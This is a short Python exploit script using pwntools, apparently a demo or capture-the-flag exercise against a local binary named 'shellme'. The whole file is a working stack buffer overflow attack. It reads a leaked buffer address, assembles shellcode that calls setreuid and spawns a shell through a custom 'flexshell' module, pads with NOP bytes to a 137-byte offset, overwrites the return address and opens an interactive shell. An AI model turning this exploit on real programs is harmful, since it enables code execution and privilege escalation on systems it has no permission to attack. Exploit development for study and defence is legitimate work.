#!/usr/bin/env python3
from pwn import *
import flexshell

######################################################
# TODO: Demo fleshell against some vulnerable code
# Currently works for both nobinsh and compact
# shellcode. However, only with compact shellcode
# having rbx instead of rax
#####################################################

context(arch = 'amd64', os='linux')

p = process('./shellme')
p.recvuntil(b':')
buffid = p.recvlines(1)

lengthofbuff = 137
buffid1 = buffid[0]
buffid2 = int(buffid1,16)
# payload = asm(shellcraft.setreuid(1017))
payload = asm(shellcraft.setreuid(1000))
# payload += asm(shellcraft.sh())
# Code with no /bin/sh that works below
payload += asm(flexshell.nobinsh())
# payload += asm(flexshell.compact())
lengthofbuff = lengthofbuff - len(payload)
lengthofbuff = lengthofbuff - len(buffid)
# the return address memory is located at 137 bytes
#gdb.attach(p,"b *get_name +130")
p.send(payload+ (b'\x90'*lengthofbuff)+p64(buffid2))
p.interactive()
